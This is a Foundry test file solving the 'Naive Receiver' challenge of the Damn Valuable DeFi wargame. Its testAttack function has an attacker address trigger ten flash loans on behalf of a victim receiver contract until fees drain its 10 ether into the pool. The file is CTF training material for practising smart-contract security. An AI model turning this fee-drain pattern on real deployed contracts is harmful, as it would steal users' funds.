// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {FlashLoanReceiver} from "../src/2. naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../src/2. naive-receiver/NaiveReceiverLenderPool.sol";


contract NaiveAttackTest is StdCheats, Test { 

    DamnValuableToken public token;
    NaiveReceiverLenderPool public pool;
    FlashLoanReceiver public receiver;
    
    address public attacker = address(1);

    uint256 public constant STARTING_POOL_BALANCE = 1000 ether;
    uint256 public constant STARTING_RECEIVER_BALANCE = 10 ether;
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUp() external {

        token = new DamnValuableToken();
        pool = new NaiveReceiverLenderPool();  
        receiver = new FlashLoanReceiver(address(pool));

        vm.deal(address(pool), STARTING_POOL_BALANCE);
        vm.deal(address(receiver), STARTING_RECEIVER_BALANCE);

        assertEq((address(pool).balance) ,  STARTING_POOL_BALANCE); 
        assertEq((address(receiver).balance) ,  STARTING_RECEIVER_BALANCE); 

    }


    function testAttack() public {

        vm.startPrank(attacker);
        for(uint i=0 ; i<10; i++) {
        pool.flashLoan(receiver, ETH, 1 ether, "");
        }
        vm.stopPrank();

        assertEq(address(receiver).balance , 0);
        assertEq(address(pool).balance , 1010 ether);
    }
}